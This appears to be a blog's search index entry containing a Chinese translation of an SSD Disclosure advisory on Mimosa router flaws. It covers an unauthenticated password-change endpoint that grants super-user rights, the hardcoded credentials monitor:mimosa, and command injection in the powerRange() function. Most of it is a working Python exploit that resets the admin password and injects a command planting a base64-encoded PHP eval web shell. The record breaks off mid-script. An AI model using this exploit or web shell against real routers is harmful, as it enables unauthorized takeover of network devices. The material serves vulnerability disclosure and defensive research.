<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mimosa路由器提权与身份认证绕过</title>
      <link href="/2020/07/24/Mimosa%E8%B7%AF%E7%94%B1%E5%99%A8%E6%8F%90%E6%9D%83%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
      <url>/2020/07/24/Mimosa%E8%B7%AF%E7%94%B1%E5%99%A8%E6%8F%90%E6%9D%83%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>译文来源：<a href="https://ssd-disclosure.com/ssd-advisory-mimosa-routers-privilege-escalation-and-authentication-bypass/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-mimosa-routers-privilege-escalation-and-authentication-bypass/</a></p><p>首发Freebuf：<a href="https://freebuf.com/mob/vuls/243803.html" target="_blank" rel="noopener">https://freebuf.com/mob/vuls/243803.html</a></p><h2 id="Mimosa路由器提权与身份认证绕过"><a href="#Mimosa路由器提权与身份认证绕过" class="headerlink" title="Mimosa路由器提权与身份认证绕过"></a>Mimosa路由器提权与身份认证绕过</h2><h3 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要"></a>漏洞摘要</h3><p>Mimosa Networks是全球无线宽带解决方案的技术领导者，为全球的服务商，企业，和政府运营商提供光纤连接服务。该路由器中的漏洞可以通过在web界面中执行恶意代码来绕过身份认证并提权。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>固件版本 &lt;= 1.5.1（最新版本）</p><h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>所有的Mimosa路由器的web界面均使用php编写，并且Mimosa开发人员还有自己的小型php框架。</p><p>web界面的php脚本路径位于<code>/var/www/</code>，其中一些是处理API请求，一些用于web界面。让我们来看下代码是如何处理身份认证的。</p><h4 id="身份认证绕过-提权"><a href="#身份认证绕过-提权" class="headerlink" title="身份认证绕过/提权"></a>身份认证绕过/提权</h4><p><code>/var/www/core/tinyframe/mimosa.php</code>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span> </span>&#123; <span class="comment">//Dispatcher class (Handles routing) included for reference</span></span><br><span class="line">    <span class="keyword">private</span> $output;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'q'</span>])) &#123; <span class="comment">//parse action from url querystring</span></span><br><span class="line">            $array = explode(<span class="string">'.'</span>, $_GET[<span class="string">'q'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (count($array)) &#123;</span><br><span class="line">                Application::$controller[<span class="string">'name'</span>] = strtolower(array_shift($array));</span><br><span class="line">                <span class="keyword">if</span> (count($array)) &#123;</span><br><span class="line">                    Application::$controller[<span class="string">'action'</span>] = strtolower(array_shift($array));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>($_GET[<span class="string">'q'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//line 277</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Controller</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123; <span class="comment">// The controller class handles authentication</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//line 308</span></span><br><span class="line">$noCheckController = <span class="keyword">array</span>(   <span class="comment">// This are the controllers and functions that won't require authentication</span></span><br><span class="line">            <span class="string">'index'</span> =&gt; <span class="keyword">array</span>(<span class="string">'login'</span>, <span class="string">'logout'</span>, <span class="string">'activation'</span>, <span class="string">'recovery'</span>, <span class="string">'keeprecovery'</span>),</span><br><span class="line">            <span class="string">'info'</span> =&gt; <span class="keyword">array</span>(<span class="string">'device'</span>),</span><br><span class="line">            <span class="string">'preferences'</span> =&gt; <span class="keyword">array</span>(<span class="string">'changepass'</span>),   <span class="comment">// &lt;--- The bug is here</span></span><br><span class="line">            <span class="string">'tools'</span> =&gt; <span class="keyword">array</span>(<span class="string">'antenna_data'</span>)</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>可以看到，<code>preferences</code>端点不用进行身份验证（可在<code>&lt;router_ip&gt; /index.php?q=preferences.preferences</code>处访问），提权和身份绕过漏洞就存在这处。我们来看下代码处理过程，试试可以分析下。</p><p><code>/var/www/core/controller/preferences.php</code>文件:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//line 111 </span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">changepass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">self</span>::$isPost) &#123; <span class="comment">// Checks if the request sent is POST</span></span><br><span class="line">            $saveArray = <span class="keyword">$this</span>-&gt;saveArray(<span class="string">'SuperPassword'</span>); <span class="comment">//Gets SuperPassword (admin password) from or request</span></span><br><span class="line">            <span class="keyword">foreach</span>($saveArray <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">                $value = md5($value); <span class="comment">// md5 hashing the password value</span></span><br><span class="line">            &#125;</span><br><span class="line">            $_SESSION[<span class="string">'MIM_STATE'</span>][<span class="string">'IsSuper'</span>] = <span class="keyword">true</span>; <span class="comment">//&lt;-- BUG1 Escalates our privileges to SuperUser (web ui)</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ajaxSave(<span class="string">'Passwords'</span>, $saveArray); <span class="comment">//&lt;-- BUG2 Changes the admin password with our supplied value.</span></span><br><span class="line">            Flags::create(<span class="string">'password_modified'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如上所示，漏洞原因非常简单，也非常容易利用。</p><p>利用第一个漏洞可以成为超级用户，这很重要，因为我们需要通过登录才能使会话有效。代码中使用<code>$_SESSION</code>全局变量检查会话超时。只有登陆之后才会设置这个值。若该值没有被设置，则验证就会失败。但幸运的是，mimosa有一个硬编码的web用户(<code>monitor:mimosa</code>)，可以使用最低权限登录，更好的是，不可以对更改该用户的密码或禁用。使用硬编码的认证并提权，我们可以获得对<code>web UI</code>管理权限。</p><p>第二个漏洞非常简单。我们可以无需身份验证来更改超级用户的密码。并可以使用新密码登录并完全控制。下面的<code>PoC</code>利用了这两个缺陷来实现<code>RCE</code>。  </p><h4 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h4><p>远程命令执行需要身份验证通过才可利用，通过上面其中一个漏洞，我们可获取一个有效会话并利用该漏洞。这个漏洞非常简单，让我们看下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">powerRange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $isR5 = <span class="keyword">$this</span>-&gt;product == <span class="string">'B02'</span>;</span><br><span class="line">        $bw = $_GET[<span class="string">'bw'</span>];</span><br><span class="line">        $freq1= $_GET[<span class="string">'freq'</span>];</span><br><span class="line">        $freq2 = $_GET[<span class="string">'freq2'</span>];</span><br><span class="line">        $country = country();</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">if</span> ((strlen(substr($bw, <span class="number">2</span>)) &gt; <span class="number">2</span>))</span><br><span class="line">            $bw = <span class="string">'3'</span> . str_replace(<span class="string">' FD'</span>,<span class="string">''</span>,substr($bw, <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $bw = substr($bw, <span class="number">2</span>);</span><br><span class="line">​</span><br><span class="line">        $cmd = <span class="string">"reg_query power_range $country "</span>. $bw .<span class="string">" $freq1 $freq2"</span>;</span><br><span class="line">        <span class="keyword">if</span> ( MIMOSA_PRODUCT == <span class="string">'B11'</span>) &#123;</span><br><span class="line">            $cmdRemote = $cmdLocal  = $cmd;</span><br><span class="line">​</span><br><span class="line">            $cmdLocal .= <span class="string">" gain "</span>. $_GET[<span class="string">'gain'</span>];</span><br><span class="line">            $cmdRemote.= <span class="string">" gain "</span>. $_GET[<span class="string">'gainRemote'</span>];</span><br><span class="line">​</span><br><span class="line">            $minMaxLocal = <span class="keyword">array</span>();</span><br><span class="line">            $minMaxRemote = <span class="keyword">array</span>();</span><br><span class="line">​</span><br><span class="line">            $lines = doCmd($cmdLocal, <span class="keyword">false</span>, <span class="keyword">true</span>, <span class="string">"power_range_"</span>.$country.<span class="string">"_"</span>.$bw.<span class="string">"_"</span>.$freq1.<span class="string">"_"</span>.$freq2);</span><br><span class="line">            <span class="keyword">foreach</span> ($lines <span class="keyword">as</span> $key =&gt; $line) &#123;</span><br><span class="line">                $x = explode(<span class="string">':'</span>, $line);</span><br><span class="line">                $minMaxLocal[] = <span class="keyword">array</span>((int) trim($x[<span class="number">2</span>]), (int) trim($x[<span class="number">1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">​</span><br><span class="line">            $lines = doCmd($cmdRemote, <span class="keyword">false</span>, <span class="keyword">true</span>, <span class="string">"power_range_"</span>.$country.<span class="string">"_"</span>.$bw.<span class="string">"_"</span>.$freq1.<span class="string">"_"</span>.$freq2);</span><br><span class="line">            <span class="keyword">foreach</span> ($lines <span class="keyword">as</span> $key =&gt; $line) &#123;</span><br><span class="line">                $x = explode(<span class="string">':'</span>, $line);</span><br><span class="line">                $minMaxRemote[] = <span class="keyword">array</span>((int) trim($x[<span class="number">2</span>]), (int) trim($x[<span class="number">1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>(<span class="string">'Power'</span> =&gt; range($minMaxLocal[<span class="number">0</span>][<span class="number">0</span>], $minMaxLocal[<span class="number">0</span>][<span class="number">1</span>]),</span><br><span class="line">                <span class="string">'Power2'</span> =&gt; range($minMaxRemote[<span class="number">0</span>][<span class="number">0</span>], $minMaxRemote[<span class="number">0</span>][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($isR5) &#123;</span><br><span class="line">                <span class="keyword">if</span> (intval($_GET[<span class="string">'gain'</span>]) &gt; intval($_GET[<span class="string">'gainRemote'</span>]))</span><br><span class="line">                    $cmd .= <span class="string">" gain "</span>. $_GET[<span class="string">'gain'</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    $cmd .= <span class="string">" gain "</span>. $_GET[<span class="string">'gainRemote'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            $lines = doCmd($cmd, <span class="keyword">false</span>, <span class="keyword">true</span>, <span class="string">"power_range_"</span>.$country.<span class="string">"_"</span>.$bw.<span class="string">"_"</span>.$freq1.<span class="string">"_"</span>.$freq2);</span><br><span class="line">            $minMax = <span class="keyword">array</span>();</span><br><span class="line">  ​          </span><br><span class="line">            <span class="keyword">foreach</span> ($lines <span class="keyword">as</span> $key =&gt; $line) &#123;</span><br><span class="line">                $x = explode(<span class="string">':'</span>, $line);</span><br><span class="line">                $minMax[] = <span class="keyword">array</span>((int) trim($x[<span class="number">2</span>]), (int) trim($x[<span class="number">1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count($minMax) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>(<span class="string">'Power'</span> =&gt; range($minMax[<span class="number">0</span>][<span class="number">0</span>], $minMax[<span class="number">0</span>][<span class="number">1</span>]),</span><br><span class="line">                        <span class="string">'Power2'</span> =&gt; range($minMax[<span class="number">1</span>][<span class="number">0</span>], $minMax[<span class="number">1</span>][<span class="number">1</span>]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>(<span class="string">'Power'</span> =&gt; range($minMax[<span class="number">0</span>][<span class="number">0</span>], $minMax[<span class="number">0</span>][<span class="number">1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>从上面代码中我们可以看到函数<code>powerRange()</code> (可在 <code>&lt;router_ip&gt;/index.php?q=wireless.powerRange</code>处访问)使用<code>doCmd()</code>执行命令，但却没有进行过滤。如果产品为B11，则代码具有俩条路径，但是两种情况下都会发生RCE。</p><p>顺便说一下，<code>/var/www/</code>目录默认不可写（<code>squashfs</code> 文件系统），可通过使用挂载<code>/var/www/help/</code>到<code>/tmp/&lt;some_dir&gt;</code>这个目录来上传<code>shell</code>。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ssd-disclosure.com/wp-content/uploads/2020/06/mimosaexpl.gif" target="_blank" rel="noopener">https://ssd-disclosure.com/wp-content/uploads/2020/06/mimosaexpl.gif</a></p><p><img src="/Users/fans0n/Desktop/t0194c60e8a6e47d2ae.png" alt=""></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> encode </span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MimosaExploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.cookie = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_version</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Fingerprinting device.'</span></span><br><span class="line">        r = requests.post(self.url+<span class="string">'/index.php?q=index.login&amp;mimosa_ajax=1'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'username'</span>:<span class="string">'a'</span>,<span class="string">'password'</span>:<span class="string">'b'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-] Failed to fetch device info, Are you sure this is mimosa device?"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = json.loads(r.text)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Device Model: &#123;&#125;\n[+] Version: &#123;&#125;'</span>.format(data[<span class="string">'productName'</span>],data[<span class="string">'version'</span>])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Failed to parse device info.'</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoginMonitor</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Attempting to login as the monitor user (lowest privilege)'</span></span><br><span class="line">        r = requests.post(self.url+<span class="string">'/index.php?q=index.login&amp;mimosa_ajax=1'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'username'</span>:<span class="string">'monitor'</span>,<span class="string">'password'</span>:<span class="string">'mimosa'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span> <span class="keyword">and</span> r.text.find(<span class="string">'error'</span>) != <span class="number">-1</span> <span class="keyword">and</span> r.text.find(<span class="string">'Login failed'</span>) != <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Login seems to have failed :('</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Try using the password change exploit?'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Set-Cookie'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.headers.keys():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] No session recieved, maybe retry?'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.cookie = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Got cookie: &#123;&#125;'</span>.format(self.cookie)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoginAdmin</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Attempting to login as the admin user'</span></span><br><span class="line">        r = requests.post(self.url+<span class="string">'/index.php?q=index.login&amp;mimosa_ajax=1'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'username'</span>:<span class="string">'admin'</span>,<span class="string">'password'</span>:<span class="string">'admin'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span> <span class="keyword">and</span> r.text.find(<span class="string">'error'</span>) != <span class="number">-1</span> <span class="keyword">and</span> r.text.find(<span class="string">'Login failed'</span>) != <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Login seems to have failed :(, maybe retry?'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Set-Cookie'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.headers.keys():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] No session recieved, maybe retry?'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.cookie = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Got cookie: &#123;&#125;'</span>.format(self.cookie)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">EscalatePrivilege</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Escalating privilege to Super User'</span></span><br><span class="line">        r = requests.post(self.url+<span class="string">'/index.php?q=preferences.changepass&amp;mimosa_ajax=1'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'super'</span>:<span class="string">'GotJuice?'</span>&#125;,cookies=&#123;<span class="string">'PHPSESSID'</span>:self.cookie&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Failed to escalate privileges'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(r.text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[-] Failed to escalate privileges, Invalid response'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Successfully got Super User privileges'</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ChangeAdminPassword</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Changing the admin password to admin'</span></span><br><span class="line">        r = requests.post(self.url+<span class="string">'/index.php?q=preferences.changepass&amp;mimosa_ajax=1'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'super'</span>:<span class="string">'GotJuice?'</span>&#125;,cookies=&#123;<span class="string">'PHPSESSID'</span>:self.cookie&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Failed to change the password'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(r.text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[-] Failed to change the password, Invalid response'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Successfully changed the admin password'</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ExploitRCE</span><span class="params">(self,Shell=True)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Beginning RCE exploit'</span></span><br><span class="line">        <span class="keyword">if</span> Shell == <span class="literal">False</span>:</span><br><span class="line">            cmd = raw_input(<span class="string">"Input command you want to execute&gt; "</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Shell base64 decoded</span></span><br><span class="line">            <span class="comment">#&lt;?php</span></span><br><span class="line">            <span class="comment">#eval(base64_decode($_REQUEST['p']));</span></span><br><span class="line">            <span class="comment">#?&gt;</span></span><br><span class="line">            cmd = <span class="string">"mkdir /tmp/.help;cp -r /var/www/help/* /tmp/.help;mount | grep /var/www/help || mount -o bind /tmp/.help /var/www/help;echo PD9waHAKZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFsncCddKSk7Cj8+ | base64 -d &gt; /tmp/.help/load_help.php"</span></span><br><span class="line">        </span><br><span class="line">        r = requests.get(self.url+<span class="string">'/index.php?q=wireless.powerRange&amp;mimosa_ajax=1&amp;bw=ASS;'</span>+cmd+<span class="string">';#&amp;gain=BB&amp;gainRemote=AA'</span>,verify=<span class="literal">False</span>,cookies=&#123;<span class="string">'PHPSESSID'</span>:self.cookie&#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span> <span class="keyword">and</span> r.text.lower().find(<span class="string">'power'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Executing the command might have failed'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Successfully executed the command'</span></span><br><span class="line">        <span class="keyword">if</span> Shell == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Checking if shell is uploaded'</span></span><br><span class="line">            r = requests.post(self.url+<span class="string">'/help/load_help.php'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'p'</span>:encode(<span class="string">"echo \"_UPLOADED_\";"</span>)&#125;)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> r.text.strip() == <span class="string">'_UPLOADED_'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Shell is uploaded'</span></span><br><span class="line">            <span 